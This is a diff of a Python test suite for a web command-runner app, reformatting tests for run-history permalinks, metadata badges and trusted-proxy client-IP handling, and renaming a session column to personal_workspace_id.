-                    headers={"X-Session-ID": anonymous_session_id('other-session')},
-                ).data
+                    headers={"X-Session-ID": anonymous_session_id("other-session")},
+                )
+                .data
             )
             assert data["command"] == "dig google.com"
             assert "answer section" in data["output"]
@@ -25807,6 +26448,7 @@ class TestRunPermalinkRoute:
         member_id = f"tmem_permalink_{uuid.uuid4().hex[:12]}"
         created = datetime.now(timezone.utc).isoformat()
         from services.teams.storage import token_hash
+
         register_durable_session_token(owner_token)
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
@@ -25840,7 +26482,7 @@ class TestRunPermalinkRoute:
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
             "INSERT INTO entity_labels "
-            "(id, session_id, entity_type, entity_id, label, created) "
+            "(id, personal_workspace_id, entity_type, entity_id, label, created) "
             "VALUES (?, ?, 'run', ?, 'team-private', datetime('now'))",
             ("permalink-team-label", owner_token, run_id),
         )
@@ -25851,9 +26493,7 @@ class TestRunPermalinkRoute:
             assert public_resp.status_code == 200
             assert b"dig team.example" in public_resp.data
 
-            public_json = json.loads(
-                client.get(f"/history/{run_id}?json", headers={"X-Session-ID": owner_token}).data
-            )
+            public_json = json.loads(client.get(f"/history/{run_id}?json", headers={"X-Session-ID": owner_token}).data)
             assert public_json["command"] == "dig team.example"
             assert "team answer section" in public_json["output"]
             assert public_json["label_count"] == 0
@@ -25886,10 +26526,12 @@ class TestRunPermalinkRoute:
         )
         try:
             data = json.loads(
-                get_client().get(
+                get_client()
+                .get(
                     f"/history/{run_id}?json",
-                    headers={"X-Session-ID": anonymous_session_id('test-session')},
-                ).data
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .data
             )
             assert data["command"] == "man curl"
             assert data["output"] == ["full line 1", "full line 2"]
@@ -25906,11 +26548,12 @@ class TestRunPermalinkRoute:
             full_output_lines=["full line 1", "full line 2"],
         )
         from services.runs.output_store import RUN_OUTPUT_DIR
+
         os.unlink(Path(RUN_OUTPUT_DIR) / f"{run_id}.txt.gz")
         try:
             resp = get_client().get(
                 f"/history/{run_id}?json",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
+                headers={"X-Session-ID": anonymous_session_id("test-session")},
             )
             data = json.loads(resp.data)
             assert resp.status_code == 200
@@ -25932,17 +26575,18 @@ class TestRunPermalinkRoute:
         )
         try:
             data = json.loads(
-                get_client().get(
+                get_client()
+                .get(
                     f"/history/{run_id}?json&preview=1",
-                    headers={"X-Session-ID": anonymous_session_id('test-session')},
-                ).data
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .data
             )
             assert data["command"] == "man curl"
             assert data["output"] == ["preview line"]
             assert (
                 "To view the full output, use either permalink button now; "
-                "after another command, use this command's history permalink"
-                in data["preview_notice"]
+                "after another command, use this command's history permalink" in data["preview_notice"]
             )
         finally:
             self._delete_run(run_id)
@@ -25954,7 +26598,7 @@ class TestRunPermalinkRoute:
         metadata = OutputSignalClassifier(command).classify_line(line)
         self._insert_run(run_id, command, [{"text": line, **metadata}])
         try:
-            resp = get_client().get(f"/history/{run_id}?json", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}?json", headers={"X-Session-ID": anonymous_session_id("test-session")})
             data = json.loads(resp.data)
             assert resp.status_code == 200
             source_detail = data["output_entries"][0]["source_detail"]
@@ -25969,7 +26613,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-ct-test-run"
         self._insert_run(run_id, "ping test")
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert "text/html" in resp.content_type
         finally:
             self._delete_run(run_id)
@@ -25984,7 +26628,7 @@ class TestRunPermalinkRoute:
             full_output_lines=["full line 1", "full line 2"],
         )
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert b"full line 1" in resp.data
             assert b"preview line" not in resp.data
         finally:
@@ -25994,7 +26638,7 @@ class TestRunPermalinkRoute:
         run_id = "permalink-preview-truncated-test-run"
         self._insert_run(run_id, "nmap -sV 10.0.0.1", ["preview"], preview_truncated=1, full_output_available=0)
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             assert b"preview truncated" in resp.data
         finally:
             self._delete_run(run_id)
@@ -26003,11 +26647,11 @@ class TestRunPermalinkRoute:
         run_id = "permalink-toggle-test-run"
         self._insert_run(run_id, "ping google.com", ["64 bytes"])
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             body = resp.get_data(as_text=True)
             assert 'id="toggle-ln"' in body
             assert 'id="toggle-ts" disabled' in body
-            assert 'timestamps unavailable for this permalink' in body
+            assert "timestamps unavailable for this permalink" in body
         finally:
             self._delete_run(run_id)
 
@@ -26018,24 +26662,30 @@ class TestRunPermalinkRoute:
         ]
         self._insert_run(run_id, "ping google.com", structured_preview)
         try:
-            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id('test-session')})
+            resp = get_client().get(f"/history/{run_id}", headers={"X-Session-ID": anonymous_session_id("test-session")})
             body = resp.get_data(as_text=True)
             assert "$ ping google.com" in body
             assert 'id="toggle-ts"' in body
-            assert 'timestamps unavailable for this permalink' not in body
+            assert "timestamps unavailable for this permalink" not in body
         finally:
             self._delete_run(run_id)
 
     def _insert_run_with_meta(self, run_id, command, exit_code, started, finished, output=None):
         conn = sqlite3.connect(DB_PATH)
         conn.execute(
-            "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output_preview, "
+            "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output_preview, "
             "preview_truncated, output_line_count, full_output_available, full_output_truncated) "
             "VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?, 0, 0)",
             (
-                run_id, anonymous_session_id("test-session"), command, started, finished, exit_code,
-                json.dumps(output or []), len(output or []),
-            )
+                run_id,
+                anonymous_session_id("test-session"),
+                command,
+                started,
+                finished,
+                exit_code,
+                json.dumps(output or []),
+                len(output or []),
+            ),
         )
         conn.commit()
         conn.close()
@@ -26043,15 +26693,22 @@ class TestRunPermalinkRoute:
     def test_html_view_shows_exit_code_zero_badge(self):
         run_id = "permalink-meta-exit0-run"
         self._insert_run_with_meta(
-            run_id, "curl http://example.com", 0,
-            "2026-04-10T10:00:00", "2026-04-10T10:00:05",
+            run_id,
+            "curl http://example.com",
+            0,
+            "2026-04-10T10:00:00",
+            "2026-04-10T10:00:05",
             ["HTTP/1.1 200 OK"],
         )
         try:
-            body = get_client().get(
-                f"/history/{run_id}",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
-            ).get_data(as_text=True)
+            body = (
+                get_client()
+                .get(
+                    f"/history/{run_id}",
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .get_data(as_text=True)
+            )
             assert "exit 0" in body
             assert "meta-badge-ok" in body
         finally:
@@ -26060,15 +26717,22 @@ class TestRunPermalinkRoute:
     def test_html_view_shows_nonzero_exit_code_badge(self):
         run_id = "permalink-meta-exitfail-run"
         self._insert_run_with_meta(
-            run_id, "curl http://missing.invalid", 6,
-            "2026-04-10T10:00:00", "2026-04-10T10:00:02",
+            run_id,
+            "curl http://missing.invalid",
+            6,
+            "2026-04-10T10:00:00",
+            "2026-04-10T10:00:02",
             ["curl: (6) Could not resolve host"],
         )
         try:
-            body = get_client().get(
-                f"/history/{run_id}",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
-            ).get_data(as_text=True)
+            body = (
+                get_client()
+                .get(
+                    f"/history/{run_id}",
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .get_data(as_text=True)
+            )
             assert "exit 6" in body
             assert "meta-badge-fail" in body
         finally:
@@ -26077,15 +26741,22 @@ class TestRunPermalinkRoute:
     def test_html_view_shows_duration(self):
         run_id = "permalink-meta-duration-run"
         self._insert_run_with_meta(
-            run_id, "nmap -sV 10.0.0.1", 0,
-            "2026-04-10T10:00:00", "2026-04-10T10:01:30",
+            run_id,
+            "nmap -sV 10.0.0.1",
+            0,
+            "2026-04-10T10:00:00",
+            "2026-04-10T10:01:30",
             ["Nmap done"],
         )
         try:
-            body = get_client().get(
-                f"/history/{run_id}",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
-            ).get_data(as_text=True)
+            body = (
+                get_client()
+                .get(
+                    f"/history/{run_id}",
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .get_data(as_text=True)
+            )
             assert "1m 30s" in body
         finally:
             self._delete_run(run_id)
@@ -26093,15 +26764,22 @@ class TestRunPermalinkRoute:
     def test_html_view_shows_line_count(self):
         run_id = "permalink-meta-lines-run"
         self._insert_run_with_meta(
-            run_id, "dig example.com", 0,
-            "2026-04-10T10:00:00", "2026-04-10T10:00:01",
+            run_id,
+            "dig example.com",
+            0,
+            "2026-04-10T10:00:00",
+            "2026-04-10T10:00:01",
             ["line1", "line2", "line3"],
         )
         try:
-            body = get_client().get(
-                f"/history/{run_id}",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
-            ).get_data(as_text=True)
+            body = (
+                get_client()
+                .get(
+                    f"/history/{run_id}",
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .get_data(as_text=True)
+            )
             # 3 output lines + 2 injected (prompt-echo + blank) = 5, or just check "lines" present
             assert "lines" in body
         finally:
@@ -26109,22 +26787,31 @@ class TestRunPermalinkRoute:
 
     def test_html_view_shows_app_version(self):
         from config import APP_VERSION
+
         run_id = "permalink-meta-version-run"
         self._insert_run_with_meta(
-            run_id, "whoami", 0,
-            "2026-04-10T10:00:00", "2026-04-10T10:00:00.1",
+            run_id,
+            "whoami",
+            0,
+            "2026-04-10T10:00:00",
+            "2026-04-10T10:00:00.1",
         )
         try:
-            body = get_client().get(
-                f"/history/{run_id}",
-                headers={"X-Session-ID": anonymous_session_id('test-session')},
-            ).get_data(as_text=True)
+            body = (
+                get_client()
+                .get(
+                    f"/history/{run_id}",
+                    headers={"X-Session-ID": anonymous_session_id("test-session")},
+                )
+                .get_data(as_text=True)
+            )
             assert f"v{APP_VERSION}" in body
         finally:
             self._delete_run(run_id)
 
 
 # ── Response content types ────────────────────────────────────────────────────
+
 
 class TestContentTypes:
     def test_config_returns_json(self):
@@ -26149,6 +26836,7 @@ class TestContentTypes:
 
 
 # ── get_client_ip ─────────────────────────────────────────────────────────────
+
 
 class TestGetClientIp:
     """get_client_ip() honors X-Forwarded-For only for trusted proxy peers,
@@ -26175,11 +26863,14 @@ class TestGetClientIp:
 
     def test_last_untrusted_ip_used_when_xff_has_multiple_trusted_hops(self):
         original_cidrs = list(shell_app_module.CFG.get("trusted_proxy_cidrs", []))
-        with mock.patch.dict(
-            shell_app_module.CFG,
-            {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
-            clear=False,
-        ), mock.patch.object(shell_app_module.log, "debug") as mock_debug:
+        with (
+            mock.patch.dict(
+                shell_app_module.CFG,
+                {"trusted_proxy_cidrs": original_cidrs + ["10.0.0.0/8"]},
+                clear=False,
+            ),
+            mock.patch.object(shell_app_module.log, "debug") as mock_debug,
+        ):
             get_client().get("/health", headers={"X-Forwarded-For": "5.6.7.8, 10.0.0.1"})
         calls = [c for c in mock_debug.call_args_list if c[0][0] == "REQUEST"]
         assert calls[0].kwargs["extra"]["ip"] == "5.6.7.8"
